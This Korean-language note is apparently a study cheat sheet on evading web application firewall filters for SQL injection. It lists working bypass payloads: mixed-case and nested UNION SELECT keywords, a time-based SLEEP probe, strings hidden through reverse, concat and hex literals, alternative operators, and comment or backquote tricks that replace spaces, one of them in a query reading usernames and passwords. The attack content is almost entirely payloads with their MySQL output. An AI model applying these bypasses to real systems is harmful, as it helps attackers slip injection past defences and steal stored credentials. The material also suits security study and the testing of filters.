SQL은 데이터베이스와 컬럼명을 포함해 질의문의 대소문자를 구분하지 않고 실행함
일부 방화벽에서 UNION 이라는 키워드를 통해 공격 여부를 판단할 경우 공격자는 union 을 사용해 이를 우회할 수 있다.
방화벽에서 UNION 과 union 모두 검사할 경우 대소문자를 함께 사용하여 우회할 수 있다.
UnIoN SeLecT 1,2,3
selECT SlEep(5)

방화벽에서 UNION 또는 union 이라는 문자열을 탐지하고 공백으로 치환할 경우 밑의 쿼리문 처럼 우회할 수 있다.
UNunionION SELselectECT 1,2 --
# => UNION SELECT 1,2 -- 


-- 문자열 검사 미흡
SELECT reverse('nimda'), concat('adm','in'), x'61646d696e', 0x61646d696e;
/*
+------------------+--------------------+---------------+--------------+
| reverse('nimda') | concat('adm','in') | x'61646d696e' | 0x61646d696e |
+------------------+--------------------+---------------+--------------+
| admin            | admin              | admin         | admin        |
+------------------+--------------------+---------------+--------------+
1 row in set (0.00 sec)
*/


-- 연산자 검사 미흡
SELECT 1 || 1;
/*
 +--------+
| 1 || 1 |
+--------+
|      1 |
+--------+
1 row in set (0.00 sec)
*/
-- 이 외에도 ^, =, !=, %, /, *, &, &&, |, ||, >, <, XOR, DIV, LIKE, RLIKE, REGEXP, IS, IN, NOT, MATCH, AND, OR, BETWEEN, ISNULL 등의 연산자를 사용할 수 있다.


-- 공백탐지
SELECT/**/'abc'; -- 주석을 이용한 공백 문자 검사 우회
/*
+-----+
| abc |
+-----+
| abc |
+-----+
1 row in set (0.00 sec)
*/

-- Back Quote을 이요한 공백 문자 검색 우회
SELECT`username`,(password)from`users`WHERE`username`='admin';
/*
+----------+----------------+
| username | password       |
+----------+----------------+
| admin    | admin_password |
+----------+----------------+
1 row in set (0.00 sec)
*/